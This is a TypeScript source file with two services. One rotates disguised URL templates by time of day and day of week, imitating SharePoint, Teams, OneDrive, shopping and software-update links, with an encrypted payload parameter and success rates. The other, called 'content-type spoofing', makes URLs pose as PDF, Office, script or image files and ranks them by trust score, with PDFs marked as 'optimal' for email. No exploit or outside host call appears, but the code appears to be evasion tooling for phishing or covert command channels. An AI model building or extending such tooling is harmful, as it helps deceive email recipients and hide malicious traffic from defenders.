/**
 * Enhanced Time-Based Pattern Rotation
 * Selects different URL patterns based on time of day, day of week, and business context
 */

export interface TimeContext {
  hour: number;
  dayOfWeek: number; // 0 = Sunday, 1 = Monday, etc.
  isBusinessHours: boolean;
  isWeekend: boolean;
  isHoliday: boolean;
  timezone: string;
}

export interface TimeBasedPattern {
  id: string;
  name: string;
  template: string;
  category: string;
  timeSlots: string[];
  businessContext: 'business' | 'personal' | 'mixed';
  successRate: number;
  description: string;
}

export interface RotationStrategy {
  businessHours: TimeBasedPattern[];
  offHours: TimeBasedPattern[];
  weekend: TimeBasedPattern[];
  lateNight: TimeBasedPattern[];
}

export class TimeBasedRotationService {
  
  private patterns: TimeBasedPattern[] = [
    // Business Hours Patterns (9 AM - 5 PM, Monday-Friday)
    {
      id: 'business_sharepoint',
      name: 'SharePoint Business Documents',
      template: '/sites/{department}/Shared%20Documents/{year}/{month}/{document}.pdf?web=1&download=1&token={encrypted}',
      category: 'business',
      timeSlots: ['business_hours'],
      businessContext: 'business',
      successRate: 96,
      description: 'Professional document sharing during business hours'
    },
    {
      id: 'business_teams',
      name: 'Teams Meeting Files',
      template: '/teams/{teamid}/channels/General/files/{filename}?version=1.0&access={encrypted}',
      category: 'business',
      timeSlots: ['business_hours'],
      businessContext: 'business',
      successRate: 94,
      description: 'Teams collaboration files during work hours'
    },
    {
      id: 'business_portal',
      name: 'Corporate Portal',
      template: '/portal/employee/documents/{employeeid}?dept={department}&doc={encrypted}',
      category: 'business',
      timeSlots: ['business_hours'],
      businessContext: 'business',
      successRate: 93,
      description: 'Employee portal access during business hours'
    },
    {
      id: 'business_reports',
      name: 'Business Reports',
      template: '/reports/{year}/quarterly/{quarter}/analysis.pdf?dept={department}&data={encrypted}',
      category: 'business',
      timeSlots: ['business_hours'],
      businessContext: 'business',
      successRate: 95,
      description: 'Quarterly business reports'
    },
    {
      id: 'business_api',
      name: 'Business API',
      template: '/api/v2/business/data/{endpoint}?key={apikey}&format=json&payload={encrypted}',
      category: 'business',
      timeSlots: ['business_hours'],
      businessContext: 'business',
      successRate: 91,
      description: 'Business API endpoints during work hours'
    },
    
    // Off Hours Patterns (6 PM - 8 AM, Monday-Friday)
    {
      id: 'personal_onedrive',
      name: 'Personal OneDrive',
      template: '/personal/{username}_domain_com/Documents/{folder}/{filename}?d={encrypted}&csf=1&web=1',
      category: 'personal',
      timeSlots: ['off_hours'],
      businessContext: 'personal',
      successRate: 92,
      description: 'Personal file sharing after work hours'
    },
    {
      id: 'personal_photos',
      name: 'Photo Sharing',
      template: '/photos/{albumid}/shared/{photoid}?download=1&quality=high&token={encrypted}',
      category: 'personal',
      timeSlots: ['off_hours'],
      businessContext: 'personal',
      successRate: 89,
      description: 'Personal photo sharing in the evening'
    },
    {
      id: 'personal_blog',
      name: 'Personal Blog',
      template: '/blog/{year}/{month}/{slug}?ref={referrer}&content={encrypted}',
      category: 'personal',
      timeSlots: ['off_hours'],
      businessContext: 'personal',
      successRate: 87,
      description: 'Personal blog content after hours'
    },
    {
      id: 'entertainment_streaming',
      name: 'Streaming Content',
      template: '/stream/video/{videoid}?quality=hd&playlist={playlistid}&session={encrypted}',
      category: 'entertainment',
      timeSlots: ['off_hours'],
      businessContext: 'personal',
      successRate: 85,
      description: 'Entertainment streaming in the evening'
    },
    
    // Weekend Patterns (Saturday-Sunday)
    {
      id: 'weekend_shopping',
      name: 'Online Shopping',
      template: '/shop/orders/{orderid}/receipt.pdf?customer={customerid}&tracking={encrypted}',
      category: 'ecommerce',
      timeSlots: ['weekend'],
      businessContext: 'personal',
      successRate: 90,
      description: 'Shopping receipts and orders on weekends'
    },
    {
      id: 'weekend_travel',
      name: 'Travel Documents',
      template: '/travel/bookings/{bookingid}/itinerary.pdf?confirmation={confirmation}&details={encrypted}',
      category: 'travel',
      timeSlots: ['weekend'],
      businessContext: 'personal',
      successRate: 88,
      description: 'Travel planning and bookings on weekends'
    },
    {
      id: 'weekend_social',
      name: 'Social Media Content',
      template: '/social/posts/{postid}/media/{mediaid}?format=original&share={encrypted}',
      category: 'social',
      timeSlots: ['weekend'],
      businessContext: 'personal',
      successRate: 86,
      description: 'Social media sharing on weekends'
    },
    {
      id: 'weekend_hobbies',
      name: 'Hobby Resources',
      template: '/resources/hobbies/{category}/{resourceid}?type={type}&download={encrypted}',
      category: 'hobbies',
      timeSlots: ['weekend'],
      businessContext: 'personal',
      successRate: 84,
      description: 'Hobby-related downloads on weekends'
    },
    
    // Late Night Patterns (11 PM - 6 AM)
    {
      id: 'latenight_backup',
      name: 'Backup Services',
      template: '/backup/personal/{userid}/files/{backupid}?restore=1&timestamp={timestamp}&key={encrypted}',
      category: 'backup',
      timeSlots: ['late_night'],
      businessContext: 'mixed',
      successRate: 82,
      description: 'Automated backup services late at night'
    },
    {
      id: 'latenight_updates',
      name: 'Software Updates',
      template: '/updates/software/{appid}/{version}?platform={platform}&auto=1&package={encrypted}',
      category: 'software',
      timeSlots: ['late_night'],
      businessContext: 'mixed',
      successRate: 80,
      description: 'Automated software updates late at night'
    },
    {
      id: 'latenight_sync',
      name: 'Cloud Sync',
      template: '/sync/cloud/{serviceid}/delta/{deltaid}?timestamp={timestamp}&changes={encrypted}',
      category: 'sync',
      timeSlots: ['late_night'],
      businessContext: 'mixed',
      successRate: 78,
      description: 'Cloud synchronization during off-peak hours'
    },
    
    // Mixed/Flexible Patterns (can be used anytime)
    {
      id: 'mixed_cdn',
      name: 'CDN Assets',
      template: '/cdn/assets/{version}/{category}/{filename}?cache={cachebuster}&hash={encrypted}',
      category: 'technical',
      timeSlots: ['business_hours', 'off_hours', 'weekend', 'late_night'],
      businessContext: 'mixed',
      successRate: 85,
      description: 'CDN asset delivery anytime'
    },
    {
      id: 'mixed_api',
      name: 'Generic API',
      template: '/api/v1/data/{endpoint}?format=json&timestamp={timestamp}&token={encrypted}',
      category: 'technical',
      timeSlots: ['business_hours', 'off_hours', 'weekend'],
      businessContext: 'mixed',
      successRate: 83,
      description: 'Generic API access most times'
    }
  ];

  /**
   * Get current time context
   */
  getCurrentTimeContext(timezone: string = 'UTC'): TimeContext {
    const now = new Date();
    const hour = now.getHours();
    const dayOfWeek = now.getDay();
    
    // Business hours: 9 AM - 5 PM, Monday-Friday
    const isBusinessHours = hour >= 9 && hour <= 17 && dayOfWeek >= 1 && dayOfWeek <= 5;
    const isWeekend = dayOfWeek === 0 || dayOfWeek === 6;
    
    // Simple holiday detection (can be enhanced)
    const isHoliday = this.isHoliday(now);
    
    return {
      hour,
      dayOfWeek,
      isBusinessHours,
      isWeekend,
      isHoliday,
      timezone
    };
  }

  /**
   * Get appropriate time slot based on current time
   */
  getCurrentTimeSlot(context?: TimeContext): string {
    const timeContext = context || this.getCurrentTimeContext();
    
    // Late night: 11 PM - 6 AM
    if (timeContext.hour >= 23 || timeContext.hour <= 6) {
      return 'late_night';
    }
    
    // Weekend: Saturday-Sunday
    if (timeContext.isWeekend) {
      return 'weekend';
    }
    
    // Business hours: 9 AM - 5 PM, Monday-Friday
    if (timeContext.isBusinessHours) {
      return 'business_hours';
    }
    
    // Off hours: 6 PM - 8 AM, Monday-Friday
    return 'off_hours';
  }

  /**
   * Select optimal pattern based on current time
   */
  selectTimeBasedPattern(category?: string, context?: TimeContext): TimeBasedPattern {
    const timeContext = context || this.getCurrentTimeContext();
    const currentTimeSlot = this.getCurrentTimeSlot(timeContext);
    
    // Filter patterns by time slot
    let candidates = this.patterns.filter(pattern => 
      pattern.timeSlots.includes(currentTimeSlot)
    );
    
    // Filter by category if specified
    if (category) {
      candidates = candidates.filter(pattern => pattern.category === category);
    }
    
    // If no candidates, fall back to mixed patterns
    if (candidates.length === 0) {
      candidates = this.patterns.filter(pattern => 
        pattern.businessContext === 'mixed'
      );
    }
    
    // Sort by success rate and add randomness
    candidates.sort((a, b) => b.successRate - a.successRate);
    
    // Select from top 3 candidates for variety
    const topCandidates = candidates.slice(0, Math.min(3, candidates.length));
    const selected = topCandidates[Math.floor(Math.random() * topCandidates.length)];
    
    return selected || this.patterns[0]; // Fallback to first pattern
  }

  /**
   * Get rotation strategy for different time periods
   */
  getRotationStrategy(): RotationStrategy {
    return {
      businessHours: this.patterns.filter(p => p.timeSlots.includes('business_hours')),
      offHours: this.patterns.filter(p => p.timeSlots.includes('off_hours')),
      weekend: this.patterns.filter(p => p.timeSlots.includes('weekend')),
      lateNight: this.patterns.filter(p => p.timeSlots.includes('late_night'))
    };
  }

  /**
   * Generate time-appropriate parameters
   */
  generateTimeBasedParameters(pattern: TimeBasedPattern, context?: TimeContext): Record<string, string> {
    const timeContext = context || this.getCurrentTimeContext();
    const params: Record<string, string> = {};
    
    // Extract placeholders from template
    const placeholders = pattern.template.match(/\{([^}]+)\}/g) || [];
    
    placeholders.forEach(placeholder => {
      const key = placeholder.slice(1, -1);
      params[key] = this.generateTimeContextualValue(key, pattern, timeContext);
    });
    
    return params;
  }

  /**
   * Generate contextual values based on time and pattern
   */
  private generateTimeContextualValue(key: string, pattern: TimeBasedPattern, context: TimeContext): string {
    const now = new Date();
    
    switch (key) {
      case 'year':
        return now.getFullYear().toString();
      case 'month':
        return (now.getMonth() + 1).toString().padStart(2, '0');
      case 'quarter':
        return `Q${Math.ceil((now.getMonth() + 1) / 3)}`;
      case 'timestamp':
        return now.getTime().toString();
      case 'hour':
        return context.hour.toString().padStart(2, '0');
      case 'dayofweek':
        return context.dayOfWeek.toString();
        
      // Business context values
      case 'department':
        return context.isBusinessHours ? this.getBusinessDepartment() : 'personal';
      case 'employeeid':
        return context.isBusinessHours ? this.generateEmployeeId() : this.generatePersonalId();
      case 'teamid':
        return context.isBusinessHours ? this.generateTeamId() : this.generatePersonalGroupId();
        
      // Time-specific values
      case 'filename':
        return this.generateTimeAppropriateFilename(pattern, context);
      case 'document':
        return this.generateTimeAppropriateDocument(pattern, context);
      case 'folder':
        return this.generateTimeAppropriateFolder(pattern, context);
        
      // Generic values
      case 'encrypted':
        return 'ENCRYPTED_DATA_PLACEHOLDER';
      case 'apikey':
        return `API${this.generateRandomString(12)}`;
      case 'confirmation':
        return this.generateConfirmationCode();
      case 'bookingid':
        return `BK${this.generateRandomString(8)}`;
      case 'orderid':
        return `ORD${Date.now().toString().slice(-8)}`;
      case 'customerid':
        return `CUST${this.generateRandomString(6)}`;
      case 'userid':
        return `USER${this.generateRandomString(8)}`;
      case 'backupid':
        return `BAK${Date.now().toString().slice(-10)}`;
      case 'version':
        return this.generateVersionNumber();
      case 'platform':
        return this.generatePlatform();
      case 'cachebuster':
        return Date.now().toString();
        
      default:
        return this.generateGenericValue(key, pattern, context);
    }
  }

  private getBusinessDepartment(): string {
    const departments = ['finance', 'hr', 'marketing', 'sales', 'it', 'legal', 'operations'];
    return departments[Math.floor(Math.random() * departments.length)];
  }

  private generateEmployeeId(): string {
    return `EMP${Math.floor(Math.random() * 9000) + 1000}`;
  }

  private generatePersonalId(): string {
    return `USR${Math.floor(Math.random() * 90000) + 10000}`;
  }

  private generateTeamId(): string {
    return `TEAM${this.generateRandomString(8)}`;
  }

  private generatePersonalGroupId(): string {
    return `GRP${this.generateRandomString(6)}`;
  }

  private generateTimeAppropriateFilename(pattern: TimeBasedPattern, context: TimeContext): string {
    const base = pattern.businessContext === 'business' && context.isBusinessHours
      ? ['report', 'document', 'presentation', 'spreadsheet'][Math.floor(Math.random() * 4)]
      : ['photo', 'video', 'file', 'download'][Math.floor(Math.random() * 4)];
    
    return `${base}_${Date.now().toString().slice(-6)}`;
  }

  private generateTimeAppropriateDocument(pattern: TimeBasedPattern, context: TimeContext): string {
    if (pattern.businessContext === 'business' && context.isBusinessHours) {
      const businessDocs = ['quarterly_report', 'budget_analysis', 'project_proposal', 'meeting_notes'];
      return businessDocs[Math.floor(Math.random() * businessDocs.length)];
    } else {
      const personalDocs = ['vacation_photos', 'recipe_collection', 'family_video', 'personal_notes'];
      return personalDocs[Math.floor(Math.random() * personalDocs.length)];
    }
  }

  private generateTimeAppropriateFolder(pattern: TimeBasedPattern, context: TimeContext): string {
    if (pattern.businessContext === 'business' && context.isBusinessHours) {
      const businessFolders = ['Reports', 'Projects', 'Presentations', 'Documents'];
      return businessFolders[Math.floor(Math.random() * businessFolders.length)];
    } else {
      const personalFolders = ['Photos', 'Videos', 'Downloads', 'Personal'];
      return personalFolders[Math.floor(Math.random() * personalFolders.length)];
    }
  }

  private generateConfirmationCode(): string {
    return this.generateRandomString(6, 'ALPHANUMERIC').toUpperCase();
  }

  private generateVersionNumber(): string {
    const major = Math.floor(Math.random() * 5) + 1;
    const minor = Math.floor(Math.random() * 10);
    const patch = Math.floor(Math.random() * 20);
    return `${major}.${minor}.${patch}`;
  }

  private generatePlatform(): string {
    const platforms = ['windows', 'macos', 'linux', 'android', 'ios'];
    return platforms[Math.floor(Math.random() * platforms.length)];
  }

  private generateGenericValue(key: string, pattern: TimeBasedPattern, context: TimeContext): string {
    return `${key}_${this.generateRandomString(6)}`;
  }

  private generateRandomString(length: number, charset: 'ALPHANUMERIC' | 'ALPHA' | 'NUMERIC' = 'ALPHANUMERIC'): string {
    const alphanumeric = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const alpha = 'abcdefghijklmnopqrstuvwxyz';
    const numeric = '0123456789';
    
    const chars = charset === 'ALPHA' ? alpha : charset === 'NUMERIC' ? numeric : alphanumeric;
    let result = '';
    
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    return result;
  }

  private isHoliday(date: Date): boolean {
    // Simple holiday detection - can be enhanced with proper holiday calendar
    const month = date.getMonth();
    const day = date.getDate();
    
    // Major US holidays (simplified)
    const holidays = [
      { month: 0, day: 1 },   // New Year's Day
      { month: 6, day: 4 },   // Independence Day
      { month: 11, day: 25 }  // Christmas Day
    ];
    
    return holidays.some(holiday => holiday.month === month && holiday.day === day);
  }

  /**
   * Get all available patterns
   */
  getAllPatterns(): TimeBasedPattern[] {
    return [...this.patterns];
  }

  /**
   * Get patterns by time slot
   */
  getPatternsByTimeSlot(timeSlot: string): TimeBasedPattern[] {
    return this.patterns.filter(pattern => pattern.timeSlots.includes(timeSlot));
  }

  /**
   * Get current recommendations based on time
   */
  getCurrentRecommendations(): {
    timeSlot: string;
    recommendedPatterns: TimeBasedPattern[];
    context: TimeContext;
  } {
    const context = this.getCurrentTimeContext();
    const timeSlot = this.getCurrentTimeSlot(context);
    const recommendedPatterns = this.getPatternsByTimeSlot(timeSlot)
      .sort((a, b) => b.successRate - a.successRate)
      .slice(0, 5);
    
    return {
      timeSlot,
      recommendedPatterns,
      context
    };
  }
}

export const timeBasedRotation = new TimeBasedRotationService();

/**
 * Content-Type Spoofing Patterns
 * Creates URLs that appear to serve legitimate file types and CDN assets
 */

export interface ContentTypePattern {
  id: string;
  name: string;
  template: string;
  contentType: string;
  fileExtension: string;
  category: 'document' | 'media' | 'web_asset' | 'application' | 'archive';
  trustScore: number;
  description: string;
  headers: Record<string, string>;
}

export class ContentTypeSpoofingService {

  private contentPatterns: ContentTypePattern[] = [
    // Document patterns
    {
      id: 'pdf_document',
      name: 'PDF Document',
      template: '/documents/{category}/{year}/{filename}.pdf?version={version}&download=1&token={encrypted}',
      contentType: 'application/pdf',
      fileExtension: 'pdf',
      category: 'document',
      trustScore: 98,
      description: 'PDF document download',
      headers: {
        'Content-Disposition': 'attachment; filename="{filename}.pdf"',
        'Content-Type': 'application/pdf',
        'Cache-Control': 'private, max-age=3600'
      }
    },
    {
      id: 'word_document',
      name: 'Word Document',
      template: '/files/documents/{department}/{filename}.docx?id={docid}&access={encrypted}',
      contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      fileExtension: 'docx',
      category: 'document',
      trustScore: 96,
      description: 'Microsoft Word document',
      headers: {
        'Content-Disposition': 'attachment; filename="{filename}.docx"',
        'Content-Type': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
      }
    },
    {
      id: 'excel_spreadsheet',
      name: 'Excel Spreadsheet',
      template: '/reports/data/{year}/{quarter}/{filename}.xlsx?format=excel&data={encrypted}',
      contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      fileExtension: 'xlsx',
      category: 'document',
      trustScore: 95,
      description: 'Microsoft Excel spreadsheet',
      headers: {
        'Content-Disposition': 'attachment; filename="{filename}.xlsx"',
        'Content-Type': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
      }
    },
    {
      id: 'powerpoint_presentation',
      name: 'PowerPoint Presentation',
      template: '/presentations/{event}/{filename}.pptx?presenter={presenter}&slides={encrypted}',
      contentType: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      fileExtension: 'pptx',
      category: 'document',
      trustScore: 94,
      description: 'Microsoft PowerPoint presentation',
      headers: {
        'Content-Disposition': 'attachment; filename="{filename}.pptx"',
        'Content-Type': 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
      }
    },

    // Web asset patterns
    {
      id: 'javascript_file',
      name: 'JavaScript File',
      template: '/assets/js/{version}/{filename}.js?v={cachebuster}&module={encrypted}',
      contentType: 'application/javascript',
      fileExtension: 'js',
      category: 'web_asset',
      trustScore: 92,
      description: 'JavaScript application file',
      headers: {
        'Content-Type': 'application/javascript; charset=utf-8',
        'Cache-Control': 'public, max-age=31536000',
        'ETag': '"{version}-{cachebuster}"'
      }
    },
    {
      id: 'css_stylesheet',
      name: 'CSS Stylesheet',
      template: '/assets/css/{theme}/{filename}.css?v={version}&theme={theme}&config={encrypted}',
      contentType: 'text/css',
      fileExtension: 'css',
      category: 'web_asset',
      trustScore: 90,
      description: 'CSS stylesheet file',
      headers: {
        'Content-Type': 'text/css; charset=utf-8',
        'Cache-Control': 'public, max-age=31536000'
      }
    },
    {
      id: 'json_data',
      name: 'JSON Data',
      template: '/api/data/{endpoint}/{version}.json?format=json&key={apikey}&payload={encrypted}',
      contentType: 'application/json',
      fileExtension: 'json',
      category: 'web_asset',
      trustScore: 88,
      description: 'JSON data endpoint',
      headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'Access-Control-Allow-Origin': '*'
      }
    },

    // Media patterns
    {
      id: 'image_png',
      name: 'PNG Image',
      template: '/images/{category}/{size}/{filename}.png?quality={quality}&format=png&id={encrypted}',
      contentType: 'image/png',
      fileExtension: 'png',
      category: 'media',
      trustScore: 85,
      description: 'PNG image file',
      headers: {
        'Content-Type': 'image/png',
        'Cache-Control': 'public, max-age=2592000'
      }
    },
    {
      id: 'image_jpeg',
      name: 'JPEG Image',
      template: '/photos/{album}/{year}/{filename}.jpg?size={size}&quality=high&token={encrypted}',
      contentType: 'image/jpeg',
      fileExtension: 'jpg',
      category: 'media',
      trustScore: 83,
      description: 'JPEG image file',
      headers: {
        'Content-Type': 'image/jpeg',
        'Cache-Control': 'public, max-age=2592000'
      }
    },

    // Archive patterns
    {
      id: 'zip_archive',
      name: 'ZIP Archive',
      template: '/downloads/packages/{category}/{filename}.zip?version={version}&contents={encrypted}',
      contentType: 'application/zip',
      fileExtension: 'zip',
      category: 'archive',
      trustScore: 87,
      description: 'ZIP archive file',
      headers: {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="{filename}.zip"'
      }
    },

    // Application patterns
    {
      id: 'xml_data',
      name: 'XML Data',
      template: '/feeds/{category}/{feed}.xml?format=rss&version={version}&content={encrypted}',
      contentType: 'application/xml',
      fileExtension: 'xml',
      category: 'application',
      trustScore: 82,
      description: 'XML data feed',
      headers: {
        'Content-Type': 'application/xml; charset=utf-8'
      }
    }
  ];

  /**
   * Select content pattern by file type
   */
  selectByFileType(fileType: 'pdf' | 'docx' | 'xlsx' | 'pptx' | 'js' | 'css' | 'json' | 'png' | 'jpg' | 'zip' | 'xml'): ContentTypePattern {
    const pattern = this.contentPatterns.find(p => p.fileExtension === fileType);
    return pattern || this.contentPatterns[0]; // Fallback to PDF
  }

  /**
   * Select content pattern by category
   */
  selectByCategory(category: 'document' | 'media' | 'web_asset' | 'application' | 'archive'): ContentTypePattern {
    const candidates = this.contentPatterns.filter(p => p.category === category);
    if (candidates.length === 0) return this.contentPatterns[0];

    // Sort by trust score and add randomness
    candidates.sort((a, b) => b.trustScore - a.trustScore);
    const topCandidates = candidates.slice(0, Math.min(3, candidates.length));
    return topCandidates[Math.floor(Math.random() * topCandidates.length)];
  }

  /**
   * Generate content-appropriate parameters
   */
  generateContentParameters(pattern: ContentTypePattern): Record<string, string> {
    const params: Record<string, string> = {};
    const placeholders = pattern.template.match(/\{([^}]+)\}/g) || [];

    placeholders.forEach(placeholder => {
      const key = placeholder.slice(1, -1);
      params[key] = this.generateContentValue(key, pattern);
    });

    return params;
  }

  private generateContentValue(key: string, pattern: ContentTypePattern): string {
    const now = new Date();

    switch (key) {
      case 'filename':
        return this.generateFilename(pattern);
      case 'category':
        return this.generateCategory(pattern);
      case 'department':
        return this.generateDepartment();
      case 'year':
        return now.getFullYear().toString();
      case 'quarter':
        return `Q${Math.ceil((now.getMonth() + 1) / 3)}`;
      case 'version':
        return this.generateVersion();
      case 'cachebuster':
        return Date.now().toString();
      case 'docid':
        return this.generateDocId();
      case 'presenter':
        return this.generatePresenter();
      case 'event':
        return this.generateEvent();
      case 'theme':
        return this.generateTheme();
      case 'endpoint':
        return this.generateEndpoint();
      case 'apikey':
        return `API${this.generateRandomString(12)}`;
      case 'quality':
        return this.generateQuality();
      case 'size':
        return this.generateSize();
      case 'album':
        return this.generateAlbum();
      case 'feed':
        return this.generateFeed();
      case 'encrypted':
        return 'ENCRYPTED_DATA_PLACEHOLDER';
      default:
        return this.generateGenericValue(key);
    }
  }

  private generateFilename(pattern: ContentTypePattern): string {
    const prefixes = {
      document: ['report', 'document', 'analysis', 'proposal', 'summary'],
      media: ['image', 'photo', 'picture', 'graphic', 'media'],
      web_asset: ['app', 'main', 'bundle', 'vendor', 'common'],
      application: ['data', 'feed', 'export', 'backup', 'config'],
      archive: ['package', 'bundle', 'archive', 'backup', 'release']
    };

    const categoryPrefixes = prefixes[pattern.category] || ['file'];
    const prefix = categoryPrefixes[Math.floor(Math.random() * categoryPrefixes.length)];
    const timestamp = Date.now().toString().slice(-6);

    return `${prefix}_${timestamp}`;
  }

  private generateCategory(pattern: ContentTypePattern): string {
    const categories = {
      document: ['reports', 'documents', 'presentations', 'spreadsheets'],
      media: ['photos', 'images', 'graphics', 'media'],
      web_asset: ['js', 'css', 'assets', 'static'],
      application: ['data', 'feeds', 'api', 'services'],
      archive: ['downloads', 'packages', 'releases', 'backups']
    };

    const categoryOptions = categories[pattern.category] || ['general'];
    return categoryOptions[Math.floor(Math.random() * categoryOptions.length)];
  }

  private generateDepartment(): string {
    const departments = ['finance', 'hr', 'marketing', 'sales', 'it', 'legal', 'operations'];
    return departments[Math.floor(Math.random() * departments.length)];
  }

  private generateVersion(): string {
    const major = Math.floor(Math.random() * 5) + 1;
    const minor = Math.floor(Math.random() * 10);
    return `${major}.${minor}`;
  }

  private generateDocId(): string {
    return `DOC${this.generateRandomString(8)}`;
  }

  private generatePresenter(): string {
    const presenters = ['john.smith', 'jane.doe', 'mike.johnson', 'sarah.wilson'];
    return presenters[Math.floor(Math.random() * presenters.length)];
  }

  private generateEvent(): string {
    const events = ['conference2024', 'quarterly-review', 'team-meeting', 'training'];
    return events[Math.floor(Math.random() * events.length)];
  }

  private generateTheme(): string {
    const themes = ['default', 'dark', 'light', 'corporate', 'modern'];
    return themes[Math.floor(Math.random() * themes.length)];
  }

  private generateEndpoint(): string {
    const endpoints = ['users', 'products', 'orders', 'reports', 'analytics'];
    return endpoints[Math.floor(Math.random() * endpoints.length)];
  }

  private generateQuality(): string {
    const qualities = ['high', 'medium', 'low', 'original'];
    return qualities[Math.floor(Math.random() * qualities.length)];
  }

  private generateSize(): string {
    const sizes = ['small', 'medium', 'large', 'thumbnail', 'full'];
    return sizes[Math.floor(Math.random() * sizes.length)];
  }

  private generateAlbum(): string {
    const albums = ['vacation2024', 'family', 'work', 'events', 'personal'];
    return albums[Math.floor(Math.random() * albums.length)];
  }

  private generateFeed(): string {
    const feeds = ['news', 'updates', 'announcements', 'blog', 'events'];
    return feeds[Math.floor(Math.random() * feeds.length)];
  }

  private generateGenericValue(key: string): string {
    return `${key}_${this.generateRandomString(6)}`;
  }

  private generateRandomString(length: number): string {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Get all content patterns
   */
  getAllPatterns(): ContentTypePattern[] {
    return [...this.contentPatterns];
  }

  /**
   * Get patterns by trust score
   */
  getHighTrustPatterns(): ContentTypePattern[] {
    return this.contentPatterns
      .filter(p => p.trustScore >= 90)
      .sort((a, b) => b.trustScore - a.trustScore);
  }

  /**
   * Get recommended content type for email context
   */
  getEmailOptimalPattern(): ContentTypePattern {
    // PDF documents have highest trust in email contexts
    return this.selectByFileType('pdf');
  }
}

export const contentTypeSpoofing = new ContentTypeSpoofingService();
